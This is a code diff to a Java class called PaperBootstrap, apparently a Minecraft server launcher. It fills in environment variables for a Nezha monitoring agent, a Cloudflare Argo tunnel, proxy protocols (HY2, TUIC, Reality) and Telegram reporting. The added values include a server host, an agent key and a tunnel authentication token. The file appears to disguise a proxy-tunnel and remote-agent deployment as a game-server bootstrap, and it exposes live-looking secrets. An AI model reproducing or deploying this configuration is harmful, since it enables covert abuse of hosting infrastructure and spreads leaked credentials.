@@ -92,23 +92,23 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "7033c571-1508-46a4-bade-1dbfc9c1e3c2");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_SERVER", "nzng.wfly81.dpdns.org:80");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("NEZHA_KEY", "RDYN9bmf3d9gNe8RFI3BhyeDVFCvB4gm");
+        envVars.put("ARGO_PORT", "19452");
+        envVars.put("ARGO_DOMAIN", "tindo.ksemo.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZmEwZGIxYzgzYjk5YzFjMjBmYWY0Mzk2Mjc3MzdmN2QiLCJ0IjoiOWZhY2EzMDEtMjhlYS00ZGEyLTg1NzQtOTQ5YWQ4MWZjOGQ3IiwicyI6Ik56UmpZVEZrWVRjdFpUaGhNUzAwTlRFMkxXSTFZV010Tkdaa1l6a3lOemsxWXpJMCJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "Mc");
+        envVars.put("CFIP", "cdns.doon.eu.org");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "Tindo");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
